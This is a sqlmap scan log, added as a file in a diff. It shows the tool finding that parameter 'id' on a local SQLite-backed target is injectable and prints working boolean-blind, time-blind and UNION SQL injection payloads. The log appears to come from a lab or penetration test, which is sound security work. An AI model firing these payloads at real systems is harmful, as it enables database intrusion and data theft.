@@ -1,0 +1,61 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.6.116#dev}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:39:46 /2026-06-15/
+
+[22:39:47] [INFO] flushing session file
+[22:39:47] [INFO] testing connection to the target URL
+[22:39:47] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:39:47] [INFO] testing if the target URL content is stable
+[22:39:47] [INFO] target URL content is stable
+[22:39:47] [INFO] testing if GET parameter 'id' is dynamic
+[22:39:47] [WARNING] GET parameter 'id' does not appear to be dynamic
+[22:39:47] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'SQLite')
+[22:39:47] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
+[22:39:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:39:48] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+[22:39:48] [INFO] testing 'Generic inline queries'
+[22:39:48] [INFO] testing 'SQLite inline queries'
+[22:39:48] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[22:39:48] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)
+[22:39:48] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+[22:39:48] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[22:39:51] [INFO] GET parameter 'id' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
+[22:39:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:39:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:39:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[22:39:51] [INFO] target URL appears to have 5 columns in query
+[22:39:51] [WARNING] reflective value(s) found and filtering out
+[22:39:51] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 7744=7744 AND 'ZNHF'='ZNHF
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1' AND 7586=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'iCwJ'='iCwJ
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=1' UNION ALL SELECT NULL,NULL,CHAR(113,107,118,107,113)||CHAR(99,69,100,111,73,120,79,114,81,65,121,85,75,89,121,101,79,100,112,71,105,107,101,82,86,74,119,105,84,100,85,114,99,87,80,103,85,112,117,110)||CHAR(113,113,122,112,113),NULL,NULL-- LeKs
+---
+[22:39:51] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[22:39:51] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 14 times, 500 (Internal Server Error) - 9 times
+[22:39:51] [INFO] fetched data logged to text files under 'C:\Users\<user>\AppData\Local\sqlmap\output\127.0.0.1'
+
+[*] ending @ 22:39:51 /2026-06-15/
+
